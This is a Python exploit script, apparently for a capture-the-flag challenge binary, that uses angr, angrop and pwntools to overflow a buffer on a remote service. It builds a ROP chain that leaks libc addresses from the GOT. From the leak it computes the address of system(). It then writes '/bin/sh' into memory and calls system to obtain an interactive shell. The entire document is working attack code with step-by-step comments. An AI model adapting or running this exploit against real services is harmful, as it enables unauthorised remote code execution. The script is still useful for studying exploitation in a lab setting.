import angr
import angrop
from pwn import *

r = remote("10.0.10.10", 5007)

context.log_level = "DEBUG"

# Create angr "project" on the binary
p = angr.Project("/opt/challenges/no-help/no-help_bin")

# Tell angrop to analyze it and find gadgets
rop = p.analyses.ROP()
rop.find_gadgets()

r.recvuntil("Welcome\n")

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 8) + ("a" * 8)

# Call print(got_address, 16)
# We will use this to leak two libc addresses
chain  = rop.func_call("print", [0x601018, 16])

# Call get(unused_memory, 16) for the "/bin/sh" string
chain += rop.func_call("get", [0x601080, 16])

# Call main afterwards to give us another shot
chain += rop.func_call("main", [])

# Create the final payload
# (angrop doesn't determine how much padding we will need)
payload = padding + chain.payload_str()

r.sendline(payload)

fgets = u64(r.recvn(8))
fwrite = u64(r.recvn(8))
print "fgets at %#x, fwrite at %#x" % (fgets, fwrite)

system = fgets - 0x2f6e0
print "system at %#x" % (system,)

# Send the "/bin/sh" string that will be read into the buffer
r.sendline("/bin/sh")

r.recvuntil("Welcome\n")

# Call system(unused_memory)
# This is equivalent to system("/bin/sh")
# because we will put "/bin/sh" into unused_memory
chain = rop.func_call(system, [0x601080])

# Create the final payload
# (angrop doesn't determine how much padding we will need)
payload = padding + chain.payload_str()

# Send the payload
r.sendline(payload)

# Shell!
r.interactive()
